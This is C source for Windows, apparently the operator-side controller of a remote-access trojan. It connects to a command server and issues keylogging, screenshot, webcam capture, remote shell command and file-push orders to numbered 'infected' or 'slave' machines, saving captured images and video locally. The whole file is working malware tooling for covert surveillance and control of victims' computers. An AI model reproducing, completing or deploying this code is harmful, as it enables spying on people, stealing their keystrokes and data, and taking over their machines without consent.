#define WIN32_LEAN_AND_MEAN

#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 256
#define PIPE_BUFLEN 4096
#define DEFAULT_PORT "27014"

#define HEADER_SIZE 10


enum ACTIONS{
	ACTION_KEYLOG,
	ACTION_SCREENSHOT,
	ACTION_CMD,
	ACTION_LIST_HOSTS,
	ACTION_WEBCAM_SCREENSHOT,
	ACTION_FILE
};


#define SERVER_IP "192.168.1.106"

WSADATA wsaData;
SOCKET ConnectSocket = INVALID_SOCKET;
struct addrinfo *result = NULL, *ptr = NULL, hints;
unsigned char sendbuf[DEFAULT_BUFLEN];
unsigned char recvbuf[DEFAULT_BUFLEN];
unsigned char pipebuf[PIPE_BUFLEN];
int iResult;
int recvbuflen = DEFAULT_BUFLEN;


void getInput(char * buff) {
	int i = 0;
	char c;
	while ((c = getchar()) != '\n' && c != EOF) {
		buff[i++] = c;
	}
	buff[i] = '\0';
}

// Compares string till the length of first finishes.
int strcmptillfirstends(char* first,char* str) {
	int i = 0;
	while (first[i]) {
		if (first[i] != str[i])
			return 1;
		i++;
	}
	return 0;
}



void write4BE(unsigned char * ptr, int num) {
	ptr[0] |= (num >> 24);
	ptr[1] |= ((num << 8) >> 24);
	ptr[2] |= ((num << 16) >> 24);
	ptr[3] |= ((num << 24) >> 24);
}

int read4BE(unsigned char * ptr) {
	int inum = 0;

	inum = inum | (ptr[0] << 24);
	inum = inum | (ptr[1] << 16);
	inum = inum | (ptr[2] << 8) ;
	inum = inum | ptr[3];

	return inum;
}

// size |  command  | flags | target |  data  |
//   4  |     1     |   1   |   4    |   0-x  |
// this happens only once when sending command
// filling the header with 'protocol'-like info

// target MUST be specified. Always.

// command = 0  -> sent to server!
// flags  |x|x|x|x|x|x|x|p|
// p - don't wait for result (don't print answer)
// size is highest bits first!  
int fillHeader(unsigned char* buffer, unsigned char * command) {

	unsigned char comm;
	unsigned char flags = 0;
	memset(buffer, 0, HEADER_SIZE);


	if (strcmptillfirstends("key", command) == 0) {
		comm = ACTION_KEYLOG;
	}
	else if (strcmptillfirstends("screenshot", command) == 0) {
		comm = ACTION_SCREENSHOT;
	}
	else if (strcmptillfirstends("cmd", command) == 0) {
		comm = ACTION_CMD;
	}
	else if (strcmptillfirstends("list", command) == 0) {
		comm = ACTION_LIST_HOSTS;
	}
	else if (strcmptillfirstends("webscr", command) == 0) {
		comm = ACTION_WEBCAM_SCREENSHOT;
	}
	else { // unknown command
		return;
	}

	printf("Comm:%i\n", comm);
	int i = 0;
	while (command[i++] != ' ');
	//check if flags are given

	if (command[i] == '-') {
		while (command[i] != ' ') {
			if (command[i] == 'p') {	// don't print
				flags |= 0x01;
			}
			i++;
		}
		i++;
	}

	int targetStart = i;
	while (command[i] >= '0' && command[i] <= '9') {
		i++;
	}

	int targetEnd = i;
	unsigned int oldchar = command[targetEnd];
	command[targetEnd] = '\0';
	int itarget = atoi(&command[targetStart]); //625
	command[targetEnd] = oldchar;

	// ' ' after target
	targetEnd++;
	int commandlen = strlen(&command[targetEnd]);
	int datalen = commandlen + HEADER_SIZE;

	for (int j = 0; j < commandlen; j++) {
		buffer[HEADER_SIZE + j] = command[targetEnd + j];
	}

	write4BE(&buffer[0], datalen);
	buffer[4] = comm;
	buffer[5] = flags;
	write4BE(&buffer[6], itarget);

	return datalen;
}

void initSocketAndConnect() {
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		exit(iResult);
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(SERVER_IP, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		exit(iResult);
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		printf("Trying to connect\n");
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			exit(iResult);
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		printf("Connected successfully.\n");
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		exit(1);
	}
}



void cleanup() {

	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}
	closesocket(ConnectSocket);
	WSACleanup();

}



// IN : string containing a command to execute
// OUT : nothing explicitly
// RESULT : stores command's result in pipebuf char array
void executeCommand(const char* cmd) {
	FILE* pipe = _popen(cmd, "r");
	int cread = 0;
	while (!feof(pipe)) {
		pipebuf[cread++] = fgetc(pipe);
	}
	pipebuf[cread] = '\0';
	_pclose(pipe);
}

void printInfectedList(char * receivedPacket) {
	
	int infectedCount = (read4BE(receivedPacket) - HEADER_SIZE ) / 4;
	printf("Listing %i slaves:\n", infectedCount);	
	int i = 0;
	while (i != infectedCount) {
		int infectedTarget = read4BE(&receivedPacket[HEADER_SIZE + i * 4]);
		printf("slave id:%i\n", infectedTarget);
		i++;
	}
}


// headerbuff - first data part buffer
// buff - the big buffer to store all data in
void receiveWhole(unsigned char* headerbuff, unsigned char* buff) {
	int size = read4BE(headerbuff);
	if (size > DEFAULT_BUFLEN) {
		// copy data received so far to the main buffer
		//printf("size:%i\n", size);
		memcpy(buff, &headerbuff[HEADER_SIZE], DEFAULT_BUFLEN - HEADER_SIZE);
		int i = DEFAULT_BUFLEN - HEADER_SIZE; // index in buff
		int loadedSoFar = DEFAULT_BUFLEN; // with header
		while (loadedSoFar < size) {
			int n = recv(ConnectSocket, &buff[i], DEFAULT_BUFLEN, 0);
			if (n == -1) {
				break;
			}
			loadedSoFar += n;
			i += n;
		}
	}
	else {
		// copy all data to the main buffer
		memcpy(buff, &headerbuff[HEADER_SIZE], size - HEADER_SIZE);
	}
}



//void receiveToFile(unsigned char* filename) {
//
//	FILE *f = fopen(filename, "wb");
//	int n = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
//	printf("First read:%i\n", n);
//	int len = read4BE(recvbuf);
//	printf("Incoming file len:%i\n", len);
//	fwrite(&recvbuf[HEADER_SIZE], 1, n - HEADER_SIZE, f);
//	int loadedSoFar = n; // doesnt matter if it's exact
//	int i = 0;
//	if (len > DEFAULT_BUFLEN) {
//		while (loadedSoFar < len) {
//			int toLoad;
//			if (len - loadedSoFar < DEFAULT_BUFLEN) {
//				toLoad = loadedSoFar - len;
//				if (toLoad == 0) {
//					break;
//				}
//			}
//			else {
//				toLoad = DEFAULT_BUFLEN;
//			}
//			int n = recv(ConnectSocket, recvbuf, toLoad, 0);
//			if (n <= 0) {
//				printf("Err%s\n", strerror(errno));
//				i++;
//				break;
//			}
//			loadedSoFar += n;
//			fwrite(recvbuf, 1, n, f);
//		}
//	}
//	printf("Loaded total of:%i\n", loadedSoFar);
//	fclose(f);
//}


void receiveToFile(char* filename) {
	FILE *f = fopen(filename, "wb");
	int recSoFar = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, MSG_WAITALL);
	int totalSize = read4BE(recvbuf);
	fwrite(&recvbuf[HEADER_SIZE], 1, recSoFar - HEADER_SIZE, f);

	while (recSoFar < totalSize) {
		int now = (totalSize - recSoFar < DEFAULT_BUFLEN) ? (totalSize - recSoFar) : DEFAULT_BUFLEN;
		int n = recv(ConnectSocket, recvbuf, now, MSG_WAITALL);
		fwrite(recvbuf, 1, n, f);
		recSoFar += n;
	}
	fclose(f);
	printf("total recv:%i\n", recSoFar);
}

// returns an index in command array, which indicates on which
// position data specific for every command ends, 
// for example, we can have command "file -p 4 C:/...." so it's ending after 4
// where the shared parts for command ends
//
// Writes flags, size, command and target
int fillHeaderBasic(char* command, char* buffer, unsigned char commandType) {
	unsigned char flags = 0;
	memset(buffer, 0, HEADER_SIZE);
	int i = 0;
	while (command[i++] != ' ');

	//check if flags are given
	if (command[i] == '-') {
		while (command[i] != ' ') {
			if (command[i] == 'p') {	// don't print
				flags |= 0x01;
			}
			// else if other flags...
			i++;
		}
		i++;
	}
	int targetStart = i;
	while (command[i] >= '0' && command[i] <= '9') {
		i++;
	}

	int targetEnd = i;
	unsigned int oldchar = command[targetEnd];
	command[targetEnd] = '\0';
	int itarget = atoi(&command[targetStart]); //625
	command[targetEnd] = oldchar;

	buffer[4] = commandType;
	buffer[5] = flags;
	write4BE(&buffer[6], itarget);
	// ' ' after target
	targetEnd++;


	return targetEnd;
}
int getFileSize(char* path) {
	FILE* f = fopen(path, "rb");
	fseek(f, SEEK_SET, SEEK_END);
	int size = ftell(f);
	fclose(f);
	return size + 1; // it's an index
}


void sendFile(char* command, char* sendbuff) {
	printf("Command:%s\n", command);
	ZeroMemory(sendbuff, DEFAULT_BUFLEN);
	char mypath[128];
	char infectedpath[128];
	int pos = fillHeaderBasic(command, sendbuff, ACTION_FILE);
	int i = 0;
	while (command[pos] != ' ') {	//extract my path
		mypath[i] = command[pos];
		pos++;
		i++;
	}
	mypath[i] = '\0';
	pos++; // skip ' '
	i = 0;
	while (command[pos] != '\r' && command[pos] != '\n' && command[pos] != '\0') {	// extract his path to save file at
		infectedpath[i] = command[pos];
		pos++;
		i++;
	}
	infectedpath[i] = '\0';

	//// HEADER | STRING '\0' | FILE DATA | NIC
	int fileSize = getFileSize(mypath);
	int totalSize = fileSize + HEADER_SIZE + strlen(infectedpath) + 1;  // '\0' not contained +1
	write4BE(sendbuff, totalSize);

	strcpy(&sendbuff[HEADER_SIZE], infectedpath);		
	int infectedPathSize = strlen(infectedpath);

	i = HEADER_SIZE + infectedPathSize + 1;
	FILE* f = fopen(mypath, "rb");
	fread(&sendbuff[i], 1, DEFAULT_BUFLEN - i, f);
	int howmany = totalSize > DEFAULT_BUFLEN ? DEFAULT_BUFLEN : totalSize;
	int sent = send(ConnectSocket, sendbuff, howmany, 0);
	i = sent - HEADER_SIZE - infectedPathSize - 1;

	while (sent < totalSize) {	// send the rest of file
		int rwnow = ((totalSize - sent) < DEFAULT_BUFLEN) ? (totalSize - sent) : DEFAULT_BUFLEN;
		fread(sendbuff, 1, rwnow, f);
		sent += send(ConnectSocket, sendbuff, rwnow, 0);
		printf("1");
	}
	fclose(f);
}



int main()
{
	//executeCommand("ipconfig");
	//printf("%s", pipebuf);

	initSocketAndConnect();
	
	unsigned char buff[256];
	while (1) {

		fgets(sendbuf, DEFAULT_BUFLEN, stdin);
		if (strcmptillfirstends("file", sendbuf) == 0) {
			sendFile(sendbuf, buff);
			continue;
		}

		int datalen = fillHeader(buff, sendbuf);
		iResult = send(ConnectSocket, buff, datalen, 0);

		if (strcmptillfirstends("list", sendbuf) == 0) {
			iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
			printInfectedList(recvbuf);
		}
		else if (strcmptillfirstends("cmd", sendbuf) == 0) {
			iResult = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
			int size = read4BE(recvbuf);
			unsigned char * extbuff = (unsigned char *)malloc(size + DEFAULT_BUFLEN); // + b	ecause 
			// recv reads whole buffer, atleast when we specify
			receiveWhole(recvbuf, extbuff);
			printf("%s\n", extbuff);
			free(extbuff);
		}
		else if (strcmptillfirstends("screenshot", sendbuf) == 0) {
			receiveToFile("test.bmp");
		}
		else if (strcmptillfirstends("webscr", sendbuf) == 0) {
			receiveToFile("test.avi");
		}
	}

	//cleanup();
		

	return 0;
}